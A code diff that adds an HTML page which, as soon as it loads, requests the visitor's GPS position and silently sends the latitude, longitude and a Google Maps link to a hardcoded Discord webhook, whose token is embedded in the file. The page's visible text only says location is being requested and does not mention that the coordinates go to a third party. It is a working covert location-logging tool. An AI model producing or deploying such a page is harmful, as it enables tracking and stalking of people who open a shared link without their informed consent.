@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Permission and Webhook</title>
+</head>
+<body>
+    <h1>Requesting GPS Location...</h1>
+    <p id="status">We are requesting your GPS location.</p>
+    
+    <script>
+        // The Discord webhook URL where the data will be sent
+        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY"; // Replace with your actual webhook URL
+
+        // Function to send data to Discord webhook
+        async function sendToDiscord(data) {
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+                if (!response.ok) {
+                    console.error('Failed to send data to Discord:', response.status, response.statusText);
+                } else {
+                    console.log('Data sent to Discord successfully!');
+                }
+            } catch (error) {
+                console.error('Error sending data to Discord:', error);
+            }
+        }
+
+        // Function to request GPS location and send it to Discord
+        function requestGPSLocation() {
+            if (navigator.geolocation) {
+                // Update status
+                document.getElementById('status').textContent = 'Requesting GPS permission...';
+                
+                // Get the current position
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        
+                        // Update status
+                        document.getElementById('status').textContent = 'GPS location obtained successfully!';
+                        
+                        // Prepare the payload for Discord
+                        const gpsPayload = {
+                            content: `User Location Details:`,
+                            embeds: [{
+                                title: "User GPS Location",
+                                color: 5763719, // Green color
+                                fields: [
+                                    { name: "Latitude", value: latitude, inline: true },
+                                    { name: "Longitude", value: longitude, inline: true },
+                                    { name: "Google Maps", value: `[View on Google Maps](https://maps.google.com/?q=${latitude},${longitude})`, inline: false }
+                                ]
+                            }]
+                        };
+
+                        // Send GPS data to Discord
+                        await sendToDiscord(gpsPayload);
+                    },
+                    (error) => {
+                        let errorMessage = 'Failed to verify device location.';
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "Location permission denied.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Location information is unavailable.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "The request to get user location timed out.";
+                                break;
+                            default:
+                                errorMessage = "An unknown error occurred.";
+                                break;
+                        }
+                        document.getElementById('status').textContent = errorMessage;
+                    }
+                );
+            } else {
+                document.getElementById('status').textContent = 'Geolocation is not supported by this browser.';
+            }
+        }
+
+        // Call the function to request GPS location as soon as the page loads
+        requestGPSLocation();
+    </script>
+</body>
+</html>
